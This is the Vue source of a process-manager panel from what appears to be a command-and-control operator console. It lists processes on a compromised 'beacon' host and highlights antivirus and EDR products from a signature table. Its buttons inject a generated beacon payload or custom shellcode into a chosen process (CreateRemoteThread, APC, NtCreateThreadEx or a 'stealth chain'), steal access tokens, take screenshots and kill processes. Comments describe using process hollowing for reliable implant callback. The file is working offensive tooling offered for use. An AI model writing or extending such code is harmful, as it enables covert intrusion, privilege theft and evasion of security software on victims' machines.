<template>
  <div class="cs-process-view cs-font-ui">
    <!-- Toolbar -->
    <div class="pv-toolbar">
      <div class="pv-title-group">
        <el-icon class="pv-title-icon"><Cpu /></el-icon>
        <span class="pv-title">{{ i18nStore.tl('进程管理: ', 'Processes: ') }}{{ hostDisplay }}</span>
        <span class="pv-count">({{ i18nStore.tl(`共 ${filteredList.length} 个进程`, `${filteredList.length} processes`) }})</span>
      </div>

      <!-- View Mode Toggle (Tree vs Flat) -->
      <div class="pv-mode-toggle">
        <button
          class="pv-mode-btn"
          :class="{ active: viewMode === 'tree' }"
          :title="i18nStore.tl('按父子进程层级展示', 'Process Tree View')"
          @click="viewMode = 'tree'"
        >
          <el-icon><Operation /></el-icon>
          <span>{{ i18nStore.tl('进程树', 'Tree') }}</span>
        </button>
        <button
          class="pv-mode-btn"
          :class="{ active: viewMode === 'flat' }"
          :title="i18nStore.tl('平铺展示全部进程', 'Flat Table View')"
          @click="viewMode = 'flat'"
        >
          <el-icon><Menu /></el-icon>
          <span>{{ i18nStore.tl('平铺列表', 'Flat') }}</span>
        </button>
      </div>

      <!-- Quick Filter Pills -->
      <div class="pv-filter-pills">
        <button
          class="pv-pill"
          :class="{ active: filterCategory === 'all' }"
          @click="filterCategory = 'all'"
        >
          {{ i18nStore.tl('全部', 'All') }} ({{ processList.length }})
        </button>
        <button
          v-if="detectedAvCount > 0"
          class="pv-pill pv-pill-av"
          :class="{ active: filterCategory === 'av' }"
          @click="filterCategory = 'av'"
        >
          🛡️ {{ i18nStore.tl('安全防护', 'AV/EDR') }} ({{ detectedAvCount }})
        </button>
        <button
          class="pv-pill pv-pill-beacon"
          :class="{ active: filterCategory === 'beacon' }"
          @click="filterCategory = 'beacon'"
        >
          ⭐ {{ i18nStore.tl('当前Beacon', 'Self') }}
        </button>
        <button
          class="pv-pill pv-pill-admin"
          :class="{ active: filterCategory === 'admin' }"
          @click="filterCategory = 'admin'"
        >
          👑 {{ i18nStore.tl('高权限', 'Elevated') }}
        </button>
      </div>

      <div class="pv-spacer" />

      <el-input
        v-model="searchKeyword"
        :placeholder="i18nStore.tl('过滤进程名、用户、PID、杀软...', 'Filter name, user, PID, AV...')"
        clearable
        class="pv-search-input"
      />

      <button class="cs-btn" :disabled="loading" @click="fetchProcessList">
        <el-icon :class="{ 'is-loading': loading }"><Refresh /></el-icon>
        <span>{{ i18nStore.tl('刷新', 'Refresh') }}</span>
      </button>
    </div>

    <!-- 操作条（vshell：操作集中在内容上方，取代原底部按钮行） -->
    <div class="pv-action-bar">
      <button class="cs-btn cs-btn-primary" :disabled="!selectedRow" @click="handleInject">
        {{ i18nStore.tl('进程注入 (Inject)', 'Inject') }}
      </button>
      <button class="cs-btn" :disabled="!selectedRow" @click="handleStealToken">
        {{ i18nStore.tl('窃取令牌 (Token)', 'Steal Token') }}
      </button>
      <button class="cs-btn" :disabled="!selectedRow" @click="handleScreenshot">
        {{ i18nStore.tl('屏幕截图', 'Screenshot') }}
      </button>
      <button class="cs-btn cs-btn-danger" :disabled="!selectedRow" @click="handleKill">
        {{ i18nStore.tl('结束进程 (Kill)', 'Kill') }}
      </button>
      <button class="cs-btn" @click="handleHelp">
        {{ i18nStore.tl('帮助', 'Help') }}
      </button>

      <div class="pv-spacer" />

      <span class="pv-status-info">
        {{ i18nStore.tl(`当前选中: ${selectedRow ? `${selectedRow.Name} (PID: ${selectedRow.PID})` : '无'}`, `Selected: ${selectedRow ? `${selectedRow.Name} (${selectedRow.PID})` : 'None'}`) }}
      </span>
    </div>

    <!-- Table / Tree -->
    <div class="pv-table-wrap">
      <el-table
        ref="tableRef"
        :data="displayTableData"
        row-key="PID"
        :tree-props="viewMode === 'tree' ? { children: 'children', hasChildren: 'hasChildren' } : undefined"
        default-expand-all
        size="small"
        height="100%"
        highlight-current-row
        :row-style="getRowStyle"
        class="cs-session-table"
        v-loading="loading"
        @current-change="onCurrentChange"
        @row-dblclick="handleInject"
      >
        <el-table-column prop="Name" :label="i18nStore.tl('进程名', 'Name')" min-width="260" show-overflow-tooltip>
          <template #default="{ row }">
            <div class="proc-name-cell">
              <span class="proc-name" :class="{ 'is-current': isCurrentBeaconPid(row.PID), 'is-av': !!getAvInfo(row.Name) }">
                {{ row.Name }}
              </span>

              <!-- Self Beacon Tag -->
              <span v-if="isCurrentBeaconPid(row.PID)" class="beacon-self-tag">
                ⭐ {{ i18nStore.tl('当前 Beacon', 'Self Beacon') }}
              </span>

              <!-- AV / EDR Shield Tag -->
              <span v-if="getAvInfo(row.Name)" class="av-detected-tag" :title="getAvInfo(row.Name)?.desc">
                🛡️ {{ getAvInfo(row.Name)?.name }}
              </span>
            </div>
          </template>
        </el-table-column>

        <el-table-column prop="PPID" label="PPID" width="95" sortable align="right">
          <template #default="{ row }">
            <span class="cs-font-mono text-dim">{{ row.PPID }}</span>
          </template>
        </el-table-column>

        <el-table-column prop="PID" label="PID" width="95" sortable align="right">
          <template #default="{ row }">
            <span class="cs-font-mono font-bold" :class="{ 'text-gold': isCurrentBeaconPid(row.PID), 'text-av': !!getAvInfo(row.Name) }">
              {{ row.PID }}
            </span>
          </template>
        </el-table-column>

        <el-table-column prop="Arch" :label="i18nStore.tl('架构', 'Arch')" width="85" sortable align="center">
          <template #default="{ row }">
            <span class="arch-badge" :class="row.Arch === 'x64' ? 'arch-64' : 'arch-86'">
              {{ row.Arch || 'x64' }}
            </span>
          </template>
        </el-table-column>

        <el-table-column prop="User" :label="i18nStore.tl('运行用户 / 权限', 'User / Privilege')" min-width="200" sortable show-overflow-tooltip>
          <template #default="{ row }">
            <div class="user-info-cell">
              <span v-if="isAdminUser(row.User)" class="priv-badge priv-system">👑 SYSTEM</span>
              <span v-else-if="isElevatedUser(row.User)" class="priv-badge priv-admin">⚡ Admin</span>
              <span v-else-if="row.User && row.User !== '-'" class="priv-badge priv-user">👤 User</span>
              <span class="user-text" :class="{ 'is-admin': isAdminUser(row.User) }">
                {{ row.User || '-' }}
              </span>
            </div>
          </template>
        </el-table-column>

        <el-table-column prop="ProcessInfo" :label="i18nStore.tl('会话 / 详细信息', 'Session / Details')" min-width="200" sortable show-overflow-tooltip>
          <template #default="{ row }">
            <span class="text-dim cs-font-mono">{{ row.ProcessInfo || (i18nStore.tl('会话 1', 'Session 1')) }}</span>
          </template>
        </el-table-column>

        <template #empty>
          <EmptyState
            icon="⚙️"
            variant="inline"
            :title="i18nStore.tl('暂无进程数据', 'No Process Data')"
            :desc="i18nStore.tl('点击右上角「刷新」向当前 Beacon 下发进程列表查询任务。', 'Click [ Refresh ] to query processes.')"
          />
        </template>
      </el-table>
    </div>


    <!-- Process Inject Dialog (Native CS Process Inject Modal) -->
    <el-dialog
      v-model="injectDialogVisible"
      :title="i18nStore.tl('进程注入 / 迁移 (Process Inject)', 'Process Inject / Migrate')"
      width="560px"
      :close-on-click-modal="false"
      append-to-body
      class="cs-dialog"
    >
      <div class="cs-dialog-body cs-font-ui">
        <div class="cs-dialog-desc">
          {{ i18nStore.tl('向目标进程注入 Shellcode 或完整 Beacon 载荷；注入后新会话将以该目标进程身份隐蔽上线。', 'Inject shellcode or stageless beacon into target process. The new session runs as this process.') }}
        </div>

        <div class="cs-form-row">
          <label class="cs-form-label">{{ i18nStore.tl('目标进程:', 'Target Proc:') }}</label>
          <div class="cs-form-input-wrap">
            <el-input :model-value="`${selectedRow?.Name || 'Process'} (PID: ${selectedRow?.PID || '?'}, ${selectedRow?.Arch || 'x64'}, ${selectedRow?.User || '-'})`" readonly />
          </div>
        </div>

        <div class="cs-form-row">
          <label class="cs-form-label">{{ i18nStore.tl('注入模式:', 'Inject Mode:') }}</label>
          <div class="cs-form-input-wrap">
            <el-radio-group v-model="injectForm.type">
              <el-radio-button label="listener">{{ i18nStore.tl('生成监听器载荷 (上线新会话)', 'Listener Payload') }}</el-radio-button>
              <el-radio-button label="custom">{{ i18nStore.tl('自定义 Shellcode 文件', 'Custom Shellcode') }}</el-radio-button>
            </el-radio-group>
          </div>
        </div>

        <template v-if="injectForm.type === 'listener'">
          <div class="cs-form-row">
            <label class="cs-form-label">{{ i18nStore.tl('监听器:', 'Listener:') }}</label>
            <div class="cs-form-input-wrap">
              <el-select v-model="injectForm.listener" style="width: 100%" :placeholder="i18nStore.tl('选择监听器', 'Select listener')" @visible-change="onListenerDropdown">
                <el-option v-for="l in listenerOptions" :key="l.name" :label="l.name" :value="l.name" />
              </el-select>
            </div>
          </div>
          <div class="cs-form-row">
            <label class="cs-form-label">{{ i18nStore.tl('上线密码:', 'Pass:') }}</label>
            <div class="cs-form-input-wrap">
              <el-input v-model="injectForm.pass" :placeholder="i18nStore.tl('注入载荷不支持口令参数(反射加载无命令行)', 'Pass is ignored for injected payload (no CLI args)')" />
            </div>
          </div>
        </template>

        <template v-else>
          <div class="cs-form-row">
            <label class="cs-form-label">{{ i18nStore.tl('Shellcode 文件:', 'Raw File:') }}</label>
            <div class="cs-form-input-wrap" style="display: flex; gap: 8px;">
              <el-input :model-value="customFileName || (i18nStore.tl('未选择文件', 'No file selected'))" readonly />
              <button class="cs-btn cs-btn-xs" @click="selectCustomFile">{{ i18nStore.tl('选择文件...', 'Browse...') }}</button>
              <input ref="customFileInput" type="file" style="display: none" accept=".bin,.raw,.dat,*" @change="onCustomFileChange" />
            </div>
          </div>
        </template>

        <div class="cs-form-row">
          <label class="cs-form-label">{{ i18nStore.tl('注入技术:', 'Technique:') }}</label>
          <div class="cs-form-input-wrap">
            <el-select v-model="injectForm.tech" style="width: 100%">
              <el-option :label="i18nStore.tl('auto（隐蔽注入链，推荐）', 'auto (stealth chain, recommended)')" value="auto" />
              <el-option label="NtCreateThreadEx (ntc)" value="ntc" />
              <el-option label="QueueUserAPC (apc)" value="apc" />
              <el-option label="CreateRemoteThread (crt)" value="crt" />
            </el-select>
          </div>
        </div>
      </div>

      <template #footer>
        <div class="cs-dialog-footer-center">
          <button class="cs-btn cs-btn-primary" :disabled="injectBusy || (injectForm.type === 'listener' && !injectForm.listener) || (injectForm.type === 'custom' && !customFile)" @click="submitProcessInject">
            {{ injectBusy ? (i18nStore.tl('注入中...', 'Injecting...')) : (i18nStore.tl('执行注入', 'Inject')) }}
          </button>
          <button class="cs-btn" @click="injectDialogVisible = false">{{ i18nStore.tl('取消', 'Cancel') }}</button>
        </div>
      </template>
    </el-dialog>

    <!-- Process Browser Help Dialog -->
    <el-dialog
      v-model="helpDialogVisible"
      :title="i18nStore.tl('进程管理帮助', 'Process Browser Help')"
      width="500px"
      :close-on-click-modal="true"
      append-to-body
      class="cs-dialog"
    >
      <div class="cs-dialog-body cs-font-ui pv-help-body">
        <p><b>{{ i18nStore.tl('进程树 (Tree View):', 'Tree View:') }}</b> {{ i18nStore.tl('清晰展示父进程(PPID)与子进程(PID)衍生关系，快速排查异常进程链。', 'Displays PPID->PID hierarchy to inspect execution chains.') }}</p>
        <p><b>{{ i18nStore.tl('杀软识别 (AV Detection):', 'AV Detection:') }}</b> {{ i18nStore.tl('自动匹配常见安全防御软件（360、Defender、火绒、CrowdStrike 等）并高亮标记。', 'Automatically highlights detected AV/EDR security software.') }}</p>
        <p><b>{{ i18nStore.tl('结束进程 (Kill):', 'Kill:') }}</b> {{ i18nStore.tl('向目标 Beacon 下发任务终止指定 PID 的进程。', 'Task beacon to kill the specified process by PID.') }}</p>
        <p><b>{{ i18nStore.tl('进程注入 (Inject):', 'Inject:') }}</b> {{ i18nStore.tl('将无阶段 Shellcode 注入目标进程（如 explorer.exe），使新会话在该进程内运行并上线。', 'Inject stageless shellcode into a target process to spawn a new beacon under that process.') }}</p>
        <p><b>{{ i18nStore.tl('窃取令牌 (Steal Token):', 'Steal Token:') }}</b> {{ i18nStore.tl('窃取目标进程的主访问安全令牌，使后续所有操作在该用户上下文中执行。', 'Steal the primary access token from the process to impersonate its user.') }}</p>
      </div>
      <template #footer>
        <div class="cs-dialog-footer-center">
          <button class="cs-btn cs-btn-primary" @click="helpDialogVisible = false">{{ i18nStore.tl('确定', 'OK') }}</button>
        </div>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts">
import { computed, inject, onBeforeUnmount, onMounted, reactive, ref } from 'vue'
import { useRoute , useRouter } from 'vue-router'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Cpu, Refresh, Operation, Menu, WarningFilled } from '@element-plus/icons-vue'
import ClientAPI from '@/api/clients'
import { useClientUid } from '@/utils/clientUtils'
import { useClientsStore } from '@/stores/clients'
import { useI18nStore } from '@/stores/i18n'
import { useSessionSelectionStore } from '@/stores/sessionSelection'
import EmptyState from '@/components/Common/EmptyState.vue'
import { SESSION_MARKER_COLORS } from '@/utils/sessionColors'
import { fetchListenerOptions, generateClientBinaryBlob, type ListenerOption } from '@/layout/Dialogs/Payloads/payloadUtil'

const i18nStore = useI18nStore()
const router = useRouter()
const isZh = computed(() => i18nStore.isZh)

export interface ProcessItem {
  PID: string
  PPID: string
  Name: string
  Arch: string
  User: string
  ProcessInfo?: string
  color?: string
  children?: ProcessItem[]
}

// Common Antivirus / EDR Process Signature Database
const AV_SIGNATURES: Record<string, { name: string; desc: string }> = {
  '360tray.exe': { name: '360安全卫士', desc: '360 Safe Guard Tray' },
  '360sd.exe': { name: '360杀毒', desc: '360 Antivirus' },
  'zhudongfangyu.exe': { name: '360主动防御', desc: '360 HIPS' },
  'hipsdaemon.exe': { name: '火绒安全', desc: 'Huorong Security Daemon' },
  'hipsmain.exe': { name: '火绒安全', desc: 'Huorong Security Main' },
  'wsctrl.exe': { name: '火绒控制中心', desc: 'Huorong Web Shield' },
  'usysdiag.exe': { name: '火绒诊断', desc: 'Huorong SysDiag' },
  'msmpeng.exe': { name: 'Windows Defender', desc: 'Microsoft Defender Core Service' },
  'nissrv.exe': { name: 'Windows Defender', desc: 'Microsoft Network Realtime Inspection' },
  'smartscreen.exe': { name: 'Windows SmartScreen', desc: 'Windows SmartScreen Filter' },
  'qqpcrtp.exe': { name: '腾讯电脑管家', desc: 'Tencent PC Manager RTP' },
  'qqpctray.exe': { name: '腾讯电脑管家', desc: 'Tencent PC Manager Tray' },
  'csfalconservice.exe': { name: 'CrowdStrike Falcon', desc: 'CrowdStrike Falcon Sensor' },
  'csfalconcontroller.exe': { name: 'CrowdStrike Falcon', desc: 'CrowdStrike Controller' },
  'sentinelagent.exe': { name: 'SentinelOne', desc: 'SentinelOne Agent' },
  'sentinelservicehost.exe': { name: 'SentinelOne', desc: 'SentinelOne Service' },
  'avp.exe': { name: '卡巴斯基', desc: 'Kaspersky Lab Service' },
  'kavfs.exe': { name: '卡巴斯基', desc: 'Kaspersky Antivirus' },
  'savadminservice.exe': { name: 'Sophos', desc: 'Sophos Antivirus Service' },
  'savservice.exe': { name: 'Sophos', desc: 'Sophos Real-Time Shield' },
  'edpa.exe': { name: 'Symantec DLP', desc: 'Symantec Data Loss Prevention' },
  'tanclient.exe': { name: 'Tanium', desc: 'Tanium Endpoint Client' },
  'cb.exe': { name: 'Carbon Black', desc: 'VMware Carbon Black EDR' },
}

const route = useRoute()
const clientsStore = useClientsStore()
const workspace = useSessionSelectionStore()

const injectedUid = inject<any>('realUid', null)
const getUid = () => {
  if (injectedUid && injectedUid.value) return injectedUid.value
  return useClientUid(route)
}

const viewMode = ref<'tree' | 'flat'>('tree')
const filterCategory = ref<'all' | 'av' | 'beacon' | 'admin'>('all')
const loading = ref(false)
const searchKeyword = ref('')
const selectedRow = ref<ProcessItem | null>(null)
const processList = ref<ProcessItem[]>([])

const injectDialogVisible = ref(false)
const injectBusy = ref(false)
const listenerOptions = ref<ListenerOption[]>([])
const customFileInput = ref<HTMLInputElement | null>(null)
const customFile = ref<File | null>(null)
const customFileName = ref('')
const helpDialogVisible = ref(false)

let refreshTimer: ReturnType<typeof setTimeout> | null = null

const injectForm = reactive({
  type: 'listener' as 'listener' | 'custom',
  listener: '',
  pass: '',
  tech: 'auto',
})

const currentClient = computed(() => {
  const uid = getUid()
  return clientsStore.clientsList.find((c) => c.Uid === uid)
})

const hostDisplay = computed(() => {
  if (currentClient.value) {
    const ip = currentClient.value.ExternalIP || currentClient.value.InternalIP || '0.0.0.0'
    return `${currentClient.value.Computer || 'Target'} (${ip})`
  }
  return getUid() || 'Target'
})

function getAvInfo(procName: string) {
  if (!procName) return null
  const lower = procName.toLowerCase().trim()
  return AV_SIGNATURES[lower] || null
}

const detectedAvCount = computed(() => {
  return processList.value.filter(p => !!getAvInfo(p.Name)).length
})

const filteredList = computed(() => {
  let list = processList.value
  if (filterCategory.value === 'av') {
    list = list.filter(p => !!getAvInfo(p.Name))
  } else if (filterCategory.value === 'beacon') {
    list = list.filter(p => isCurrentBeaconPid(p.PID))
  } else if (filterCategory.value === 'admin') {
    list = list.filter(p => isAdminUser(p.User) || isElevatedUser(p.User))
  }

  const kw = searchKeyword.value.trim().toLowerCase()
  if (!kw) return list
  return list.filter((p) => {
    const av = getAvInfo(p.Name)
    return (
      p.Name.toLowerCase().includes(kw) ||
      p.PID.toLowerCase().includes(kw) ||
      p.PPID.toLowerCase().includes(kw) ||
      p.User.toLowerCase().includes(kw) ||
      (av && (av.name.toLowerCase().includes(kw) || av.desc.toLowerCase().includes(kw)))
    )
  })
})

// Build tree hierarchy: PPID -> PID
function buildProcessTree(list: ProcessItem[]): ProcessItem[] {
  const itemMap = new Map<string, ProcessItem>()
  const roots: ProcessItem[] = []

  list.forEach(p => {
    itemMap.set(String(p.PID), { ...p, children: [] })
  })

  list.forEach(p => {
    const current = itemMap.get(String(p.PID))
    if (!current) return

    const parentPid = String(p.PPID)
    if (parentPid && parentPid !== '0' && parentPid !== String(p.PID) && itemMap.has(parentPid)) {
      const parent = itemMap.get(parentPid)
      if (parent) {
        if (!parent.children) parent.children = []
        parent.children.push(current)
      }
    } else {
      roots.push(current)
    }
  })

  return roots
}

const displayTableData = computed(() => {
  if (viewMode.value === 'flat' || searchKeyword.value.trim()) {
    return filteredList.value
  }
  return buildProcessTree(filteredList.value)
})

const colorPalette = SESSION_MARKER_COLORS

function isCurrentBeaconPid(pid: string) {
  return currentClient.value && String(currentClient.value.Pid) === String(pid)
}

function isAdminUser(user: string) {
  if (!user) return false
  const lower = user.toLowerCase()
  return lower.includes('system') || lower.includes('nt authority') || lower === 'root'
}

function isElevatedUser(user: string) {
  if (!user) return false
  const lower = user.toLowerCase()
  return lower.includes('admin') || lower.includes('wheel') || lower.includes('sudo')
}

function getRowStyle({ row }: { row: ProcessItem }) {
  if (row.color && row.color !== '#ffffff') {
    return { backgroundColor: `${row.color}33` }
  }
  if (isCurrentBeaconPid(row.PID)) {
    return { backgroundColor: 'color-mix(in srgb, var(--cs-warning) 12%, transparent)' }
  }
  if (getAvInfo(row.Name)) {
    return { backgroundColor: 'color-mix(in srgb, var(--cs-error) 8%, transparent)' }
  }
  return {}
}

function onCurrentChange(row: ProcessItem) {
  selectedRow.value = row
}

async function fetchProcessList() {
  const uid = getUid()
  if (!uid) return
  loading.value = true
  try {
    const res = await ClientAPI.get_pid_list({ uid })
    if (res.data?.status === 200 && Array.isArray(res.data?.data)) {
      processList.value = res.data.data
    } else {
      processList.value = []
      ElMessage.error(isZh.value ? '无法获取进程列表' : 'Failed to load process list')
    }
  } catch {
    processList.value = []
    ElMessage.error(isZh.value ? '无法获取进程列表' : 'Failed to load process list')
  } finally {
    loading.value = false
  }
}

function handleKill() {
  if (!selectedRow.value) return
  const pid = String(selectedRow.value.PID || '')
  const name = selectedRow.value.Name || 'Process'
  ElMessageBox.confirm(
    isZh.value ? `确定结束进程 ${name} (PID: ${pid}) 吗？` : `Kill process ${name} (PID: ${pid})?`,
    isZh.value ? '结束进程' : 'Kill Process',
    {
      confirmButtonText: isZh.value ? '结束进程' : 'Kill',
      cancelButtonText: isZh.value ? '取消' : 'Cancel',
      type: 'warning',
    },
  ).then(async () => {
    try {
      await ClientAPI.kill_pid({ uid: getUid(), pid })
      ElMessage.success(isZh.value ? `已下发结束进程指令 (PID: ${pid})` : `Tasked beacon to kill ${pid}`)
      if (refreshTimer) clearTimeout(refreshTimer)
      refreshTimer = setTimeout(fetchProcessList, 1000)
    } catch {
      ElMessage.error(isZh.value ? '结束进程失败' : 'Failed to issue kill task')
    }
  }).catch(() => {})
}

async function onListenerDropdown(visibleState?: boolean) {
  if (visibleState === false) return
  if (!listenerOptions.value.length) {
    listenerOptions.value = await fetchListenerOptions()
    if (!injectForm.listener && listenerOptions.value.length > 0) {
      injectForm.listener = listenerOptions.value[0].name
    }
  }
}

function handleInject() {
  if (!selectedRow.value) return
  onListenerDropdown(true)
  injectDialogVisible.value = true
}

function selectCustomFile() {
  customFileInput.value?.click()
}

function onCustomFileChange(e: Event) {
  const target = e.target as HTMLInputElement
  if (target.files && target.files.length > 0) {
    customFile.value = target.files[0]
    customFileName.value = target.files[0].name
  }
}

async function submitProcessInject() {
  if (!selectedRow.value) return
  const uid = getUid()
  const pid = String(selectedRow.value.PID)
  const arch = (selectedRow.value.Arch || 'x64').toLowerCase().includes('64') ? 'x64' : 'x86'

  injectBusy.value = true
  try {
    let payloadBlob: Blob | null = null

    if (injectForm.type === 'listener') {
      const selectedOpt = listenerOptions.value.find((l) => l.name === injectForm.listener)
      if (!selectedOpt) {
        ElMessage.error(isZh.value ? '未选中有效监听器' : 'No listener selected')
        return
      }
      payloadBlob = await generateClientBinaryBlob({
        listener: selectedOpt.name,
        osType: 'windows',
        archType: arch === 'x86' ? '386' : 'amd64',
        pass: '', // 注入载荷强制无口令：镂空进程无命令行参数，带口令会因 ExecuteKey 校验失败退出
        format: 'exe', // 完整 beacon PE：客户端走进程镂空(Process Hollowing)以新进程正常加载，可靠上线。
        // 勿改回 'bin'：donut shellcode 反射加载完整 Go beacon 到远程进程不可靠，会崩溃不上线
        vkey: selectedOpt.vkey,
        encryptSalt: selectedOpt.encryptSalt,
        quietMode: '1',
      })
    } else {
      payloadBlob = customFile.value
    }

    if (!payloadBlob) {
      ElMessage.error(isZh.value ? '载荷生成失败或未提供 Shellcode' : 'Payload generation failed')
      return
    }

    const file = new File([payloadBlob], 'inject_payload.bin', { type: 'application/octet-stream' })
    const res = await ClientAPI.inject_mem({
      uid,
      pid,
      tech: injectForm.tech || 'auto',
      file,
    })

    if (res.data?.status === 200) {
      ElMessage.success(isZh.value ? `进程注入指令已成功下发 (PID: ${pid})` : `Injected payload into PID ${pid}`)
      injectDialogVisible.value = false
    } else {
      ElMessage.error(res.data?.error || (isZh.value ? '注入下发失败' : 'Inject failed'))
    }
  } catch (error: any) {
    ElMessage.error(`${isZh.value ? '注入异常' : 'Inject error'}: ${error?.message || 'Unknown'}`)
  } finally {
    injectBusy.value = false
  }
}

async function handleStealToken() {
  if (!selectedRow.value) return
  const pid = String(selectedRow.value.PID)
  const procUser = selectedRow.value.User || '-'
  // 副作用型操作: 会替换当前 beacon 的令牌上下文,后续命令以该令牌身份执行
  try {
    await ElMessageBox.confirm(
      isZh.value
        ? `窃取 PID ${pid} (用户: ${procUser}) 的进程令牌?\n这将替换当前会话的令牌上下文,后续命令将以该令牌身份执行,可用 rev2self 恢复。`
        : `Steal the token of PID ${pid} (user: ${procUser})?\nThis replaces the current token context; subsequent commands run as that token. Use rev2self to revert.`,
      isZh.value ? '确认窃取令牌' : 'Confirm Steal Token',
      { confirmButtonText: isZh.value ? '窃取' : 'Steal', cancelButtonText: isZh.value ? '取消' : 'Cancel', type: 'warning' },
    )
  } catch {
    return
  }
  try {
    const res = await ClientAPI.steal_token({ uid: getUid(), pid })
    if (res.data?.status === 200) {
      ElMessage.success(isZh.value ? `成功窃取进程令牌 (PID: ${pid}, 用户: ${procUser})` : `Stole token from PID ${pid}`)
    } else {
      ElMessage.error(res.data?.error || (isZh.value ? '窃取令牌失败' : 'Steal token failed'))
    }
  } catch (error: any) {
    ElMessage.error(`${isZh.value ? '令牌窃取异常' : 'Token error'}: ${error?.message || 'Unknown'}`)
  }
}

function handleScreenshot() {
  const uid = getUid()
  if (!uid) return
  router.push(`/client/${uid}/screenshot`)
}

function handleHelp() {
  helpDialogVisible.value = true
}

onMounted(() => {
  fetchProcessList()
})

onBeforeUnmount(() => {
  if (refreshTimer) {
    clearTimeout(refreshTimer)
    refreshTimer = null
  }
})
</script>

<style scoped>
.cs-process-view {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: var(--cs-bg);
  overflow: hidden;
}

.pv-toolbar {
  height: 48px;
  background: var(--cs-panel);
  border-bottom: 1px solid var(--cs-card-border);
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 0 12px;
  flex-shrink: 0;
}

.pv-title-group {
  display: flex;
  align-items: center;
  gap: 8px;
  min-width: 0;
}

.pv-title-icon {
  font-size: 16px;
  color: var(--cs-online);
}

.pv-title {
  font-size: 14px;
  font-weight: 600;
  color: var(--cs-text-bright);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.pv-count {
  font-size: 13px;
  color: var(--cs-text-dim);
  white-space: nowrap;
}

.pv-mode-toggle {
  display: inline-flex;
  align-items: center;
  background: var(--cs-bg);
  border: 1px solid var(--cs-border-strong);
  border-radius: 6px;
  padding: 2px;
  gap: 2px;
  margin-left: 6px;
}

.pv-mode-btn {
  height: 24px;
  padding: 0 10px;
  font-size: 13px;
  color: var(--cs-text-dim);
  background: transparent;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  white-space: nowrap;
  display: inline-flex;
  align-items: center;
  gap: 4px;
}

.pv-mode-btn:hover {
  color: var(--cs-text);
  background: var(--cs-hover);
}

.pv-mode-btn.active {
  color: #ffffff;
  background: var(--cs-active);
  font-weight: 500;
}

.pv-filter-pills {
  display: flex;
  align-items: center;
  gap: 4px;
}

.pv-pill {
  height: 24px;
  padding: 0 10px;
  border-radius: 6px;
  border: 1px solid var(--cs-border-strong);
  background: var(--cs-panel);
  color: var(--cs-text-dim);
  font-size: 13px;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 4px;
  transition: all 120ms ease;
  white-space: nowrap;
}

.pv-pill:hover {
  background: var(--cs-hover);
  color: var(--cs-text-bright);
}

.pv-pill.active {
  background: color-mix(in srgb, var(--cs-active) 12%, transparent);
  border-color: var(--cs-active);
  color: var(--cs-active);
  font-weight: 500;
}

.pv-pill-av.active {
  background: color-mix(in srgb, var(--cs-error) 12%, transparent);
  border-color: var(--cs-error);
  color: var(--cs-error);
}

.pv-pill-beacon.active {
  background: color-mix(in srgb, var(--cs-warning) 18%, transparent);
  border-color: var(--cs-warning);
  color: var(--cs-warning);
}

.pv-pill-admin.active {
  background: color-mix(in srgb, var(--cs-elevated) 12%, transparent);
  border-color: var(--cs-elevated);
  color: var(--cs-elevated);
}

.pv-spacer { flex: 1; }

.pv-search-input {
  width: 220px;
}

/* 操作条（vshell：操作集中在内容上方，取代原底部按钮行） */
.pv-action-bar {
  height: 48px;
  padding: 0 12px;
  display: flex;
  align-items: center;
  gap: 8px;
  background: var(--cs-panel);
  border-bottom: 1px solid var(--cs-card-border);
  flex-shrink: 0;
}

.pv-table-wrap {
  flex: 1;
  margin: 12px;
  background: var(--cs-card-bg);
  border: 1px solid var(--cs-card-border);
  border-radius: 8px;
  overflow: hidden;
  position: relative;
}

.pv-table-wrap :deep(.cs-empty-icon) {
  font-size: 48px;
}

.pv-table-wrap :deep(.cs-empty-title) {
  font-size: 14px;
  color: var(--cs-text);
}

.pv-table-wrap :deep(.cs-empty-desc) {
  font-size: 13px;
}

.proc-name-cell {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
}

.proc-name {
  color: var(--cs-text-bright);
}

.proc-name.is-current {
  color: var(--cs-warning);
  font-weight: 600;
}

.proc-name.is-av {
  color: var(--cs-error);
  font-weight: 600;
}

.beacon-self-tag {
  display: inline-flex;
  align-items: center;
  height: 20px;
  padding: 0 8px;
  background: color-mix(in srgb, var(--cs-warning) 18%, transparent);
  border: 1px solid var(--cs-warning);
  color: var(--cs-warning);
  font-size: 12px;
  border-radius: 4px;
  font-weight: 500;
  white-space: nowrap;
}

.av-detected-tag {
  display: inline-flex;
  align-items: center;
  height: 20px;
  padding: 0 8px;
  background: color-mix(in srgb, var(--cs-error) 12%, transparent);
  border: 1px solid var(--cs-error);
  color: var(--cs-error);
  font-size: 12px;
  border-radius: 4px;
  font-weight: 500;
  white-space: nowrap;
}

.arch-badge {
  display: inline-flex;
  align-items: center;
  height: 20px;
  padding: 0 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
}

.arch-64 {
  background: color-mix(in srgb, var(--cs-active) 12%, transparent);
  color: var(--cs-active);
}

.arch-86 {
  background: color-mix(in srgb, var(--cs-text-dim) 15%, transparent);
  color: var(--cs-text-dim);
}

.user-info-cell {
  display: flex;
  align-items: center;
  gap: 6px;
}

.priv-badge {
  display: inline-flex;
  align-items: center;
  height: 20px;
  padding: 0 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
  white-space: nowrap;
}

.priv-system {
  background: color-mix(in srgb, var(--cs-error) 12%, transparent);
  color: var(--cs-error);
  border: 1px solid var(--cs-error);
}

.priv-admin {
  background: color-mix(in srgb, var(--cs-elevated) 12%, transparent);
  color: var(--cs-elevated);
  border: 1px solid var(--cs-elevated);
}

.priv-user {
  background: color-mix(in srgb, var(--cs-text-dim) 15%, transparent);
  color: var(--cs-text-dim);
}

.user-text {
  color: var(--cs-text);
}

.user-text.is-admin {
  color: var(--cs-text-bright);
  font-weight: 600;
}

.text-gold {
  color: var(--cs-warning) !important;
}

.text-av {
  color: var(--cs-error) !important;
}

.pv-status-info {
  font-size: 13px;
  color: var(--cs-text-dim);
  font-family: var(--cs-font-mono);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

/* Context Menu */
